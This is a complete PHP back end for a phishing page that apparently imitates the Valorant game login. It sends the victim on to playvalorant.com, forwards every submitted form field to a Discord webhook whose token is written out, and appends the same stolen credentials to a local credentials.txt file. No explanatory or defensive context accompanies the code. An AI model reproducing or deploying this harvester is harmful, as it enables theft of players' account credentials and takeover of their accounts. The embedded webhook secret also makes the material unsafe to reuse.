<?php
header('Location: https://playvalorant.com');
$webhook_url = "https://discord.com/api/webhooks/1396856315560595566/pU6C-CkgfcSWxRICiFv20dJXJUAjEVpY1xENBg4lDYSESbt2CNMOnidWZIgCdC2gDbl0"; // Replace with your Discord webhook URL
$data = http_build_query($_POST);
$curl = curl_init($webhook_url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_POSTFIELDS, json_encode(['content' => $data]));
curl_setopt($curl, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_exec($curl);
curl_close($curl);
$handle = fopen("credentials.txt", "a");
foreach($_POST as $key => $value) {
    fwrite($handle, $key . "=" . $value . "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
?>